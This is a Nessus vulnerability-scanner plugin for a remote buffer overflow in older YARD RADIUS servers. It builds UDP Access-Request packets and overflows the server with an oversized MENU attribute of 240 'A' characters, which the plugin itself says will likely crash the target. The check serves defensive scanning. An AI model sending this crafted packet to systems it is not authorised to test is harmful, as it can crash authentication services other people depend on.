#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");


if (description)
{
 script_id(15892);
 script_version("$Revision: 1.15 $");
 script_cvs_date("$Date: 2016/11/01 20:05:52 $");

 script_cve_id("CVE-2004-0987");
 script_bugtraq_id(11753);
 script_osvdb_id(12139);
 script_xref(name:"Secunia", value:"13312");

 script_name(english:"YardRadius process_menu Function Remote Buffer Overflow");
 script_summary(english:"Overflows YARD RADIUS");

 script_set_attribute(attribute:"synopsis", value:
"The remote host is running a vulnerable RADIUS server that may allow a
remote attacker to gain a shell." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running YARD RADIUS 1.0.20 or older. 
This version is vulnerable to a buffer overflow that allows a remote
attacker to execute arbitrary code in the context of the RADIUS server. 

*** It is likely that this check made the remote RADIUS server crash ***");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2004/Nov/343");
 script_set_attribute(attribute:"solution", value:"Upgrade to the latest version of this software.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"false");

 script_set_attribute(attribute:"vuln_publication_date", value:"2004/07/01");
 script_set_attribute(attribute:"patch_publication_date", value:"2004/07/01");
 script_set_attribute(attribute:"plugin_publication_date", value:"2004/12/01");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2004-2016 Tenable Network Security, Inc.");
 script_family(english:"Gain a shell remotely");

 script_require_keys("Settings/ParanoidReport");

 exit(0);
}


include("audit.inc");
include("global_settings.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = 1812;
if (!get_udp_port_state(port)) audit(AUDIT_PORT_CLOSED, port, "UDP");

soc = open_sock_udp(port);
if (!soc) audit(AUDIT_SOCK_FAIL, port, "UDP");

name = "Nessus";

coolreq = raw_string (0x01,      # Code: Access Request (1)
		  0x12,      # Packet identifier: 0x12 (18)
		  0x00,0x1C,      # Length: 58
		  # Authenticator :
		  0x20,0x20,0x20,0x20,0x20,0x20,0x31,0x31,0x30,0x31,0x39,0x31,0x32,0x38,0x34,0x32,
		  0x01,      # Attribute code : 1 (User-Name)
		  0x08,      # Att length
		  0x4E,0x65,0x73,0x73,0x75,0x73);

send(socket:soc, data:coolreq);
r = recv(socket:soc, length:4096);
if (!r) exit (0);

menu = "MENU=" + crap(data:"A", length:240);

req = raw_string (# Authenticator :
		  0x20,0x20,0x20,0x20,0x20,0x20,0x31,0x31,0x30,0x31,0x39,0x31,0x32,0x38,0x34,0x30,
		  0x01,      # Attribute code : 1 (User-Name)
		  (strlen(name)+2) % 256       # Attibute length
		  )
		  + name +
      raw_string (0x18,      # Attribute code : PW_STATE (24)
		  (strlen(menu)+2) % 256      # Attribute length
		  )
		  + menu;

len_hi = (strlen(req) + 4)/256;
len_lo = (strlen(req) + 4)%256;

req = raw_string (0x01,      # Code: Access Request (1)
		  0x12,      # Packet identifier: 0x12 (18)
		  len_hi,len_lo) + req;

send(socket:soc, data:req);
r = recv(socket:soc, length:4096);

send(socket:soc, data:coolreq);
r = recv(socket:soc, length:4096);
if (!r) security_hole(port:port, proto:"udp");
